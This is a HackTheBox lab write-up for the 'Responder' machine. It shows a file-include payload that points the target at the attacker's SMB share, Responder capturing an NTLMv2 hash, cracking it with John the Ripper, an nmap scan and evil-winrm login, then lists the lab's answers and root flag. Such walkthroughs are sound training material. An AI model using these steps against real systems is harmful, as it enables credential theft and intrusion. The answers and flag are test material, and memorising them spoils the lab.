TITLE: Responder
CATEGORY: HackTheBox
DATE: 2026-05-07
IMAGE: ./assets/Responder.png
---

# Start

1. first problem

> i have a big problem to access the site from the browser because im using docker but i found away to use ssh as a proxy to get  
```bash
docker run -it --name my-daily-lab --cap-add=NET_ADMIN --device=/dev/net/tun -p 2222:22 my-htb-machine /bin/bash
ssh -D 9050 root@127.0.0.1 -p 2222


```
> bind binding the port 2222 from myhost to 22 of the ssh i can now use it as a proxy 
> use foxy proxy to do that so basic
2. second problem
> onther problem is that u need to access the site using the domain not the ip, so u need to add this on /etc/hosts

```
echo "<add ip of the machine here > unika.htb"

```
3. now stealing the hash of the admin
to steal the hash of admin u will ne to trick windows to think that we are the server right server
ask it to give us the admin hash to verfiy that they are the admin 
we take the hash we crack it and we get the user password
### how to do that ??
first we exploit the first protocol of name resolution protocol 
basically we start by tring the first vulnerability of the site local file include  
`
http://unika.htb/index.php?page=??
`
that we can add any file and it will get it to us but if it has an ip i will fetch the file form there
and it will get it.

so we do this 
`
➜  /htb ip a show tun0
2: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none 
    inet 10.10.15.216/23 brd 10.10.15.255 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 dead:beef:2::11d6/64 scope global 
       valid_lft forever preferred_lft forever
    inet6 fe80::e78a:c8e2:46de:a01b/64 scope link stable-privacy 
       valid_lft forever preferred_lft forever
➜  /htb 


`
to get the ur machine's ip address for me it is 10.10.15.216 so to use to trick the windows protocol name resolution protocol
that we are the server insted  of pretending to be (in this case it not tricking but we are the host)

> starting the exploit kit
```
responder -I <ur interface>
```
go to browser request this 
```
http://unika.htb/index.php?page=//10.10.15.216/share
```
this i will basically trigger the file on my end.
> windows ntlmv2 authentication handshake
responder will trick the windows ntlmv2 authentication handshake 
it mean that it will force windows to send us the handshake to verify if they are admin 
if this succeed u will find the handshake on file on /usr/share/responder/logs/somefile
> cracking
im going to use join the ripper to crack this using the rock u wordlist 
`
➜  /htb john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt /usr/share/responder/logs/SMB-NTLMv2-SSP-10.129.142.63.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)     
1g 0:00:00:00 DONE (2026-05-08 12:02) 3.703g/s 15170p/s 15170c/s 15170C/s slimshady..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
`
> remote accessing
now nmap scan to see all the open port so we find a thing that we can connect to with our cracked password
```
esponder nmap --min-rate 5000 -T4 -Pn -p 0-9999 10.129.142.63 -o nmap_scan -v -sC 
Warning: The -o option is deprecated. Please use -oN
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-08 12:05 +0000
NSE: Loaded 127 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 12:05
Completed NSE at 12:05, 0.00s elapsed
Initiating NSE at 12:05
Completed NSE at 12:05, 0.00s elapsed
Initiating SYN Stealth Scan at 12:05
Scanning unika.htb (10.129.142.63) [10000 ports]
Discovered open port 80/tcp on 10.129.142.63
Discovered open port 5985/tcp on 10.129.142.63
Completed SYN Stealth Scan at 12:05, 4.23s elapsed (10000 total ports)
NSE: Script scanning 10.129.142.63.
Initiating NSE at 12:05
Completed NSE at 12:05, 5.07s elapsed
Initiating NSE at 12:05
Completed NSE at 12:05, 0.00s elapsed
Nmap scan report for unika.htb (10.129.142.63)
Host is up (0.065s latency).
Not shown: 9998 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
|_http-title: Unika
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
5985/tcp open  wsman

NSE: Script Post-scanning.
Initiating NSE at 12:05
Completed NSE at 12:05, 0.00s elapsed
Initiating NSE at 12:05
Completed NSE at 12:05, 0.00s elapsed
Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 9.82 seconds
           Raw packets sent: 20000 (880.000KB) | Rcvd: 4 (176B)

```
nice evil-winrm is a good thing 

```
evil-winrm -i 10.129.142.63 -u Administrator -p 'password'
```

after this u will connect to the windows machine will need to find the desktop of onther user to get the flag



## Tasks

1. When visiting the web service using the IP address, what is the domain that we are being redirected to?
`
unika.htb
`

2. Which scripting language is being used on the server to generate webpages?
`
php
`

3. What is the name of the URL parameter which is used to load different language versions of the webpage?
`
page
`

4. Which of the following values for the page parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "mimikatz.exe"
`
../../../../../../../../windows/system32/drivers/etc/hosts
`

5. Which of the following values for the page parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "./../../../../../../../windows/system32/drivers/etc/hosts", "mimikatz.exe"
`
//10.10.14.6/somefile
`

6. What does NTLM stand for?
`
New Technology Lan Manager
`

7. Which flag do we use in the Responder utility to specify the network interface?
`
-I
`

8. There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as john, but the full name is what?.
`
John The Ripper
`

9. What is the password for the administrator user?
`
badminton
`

10. We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?
`
5985
`

11. On which user's desktop is the flag located?
`
mike
`

12. Submit root flag
`
ea81b7afddd03efaa0945333ed147fac
`
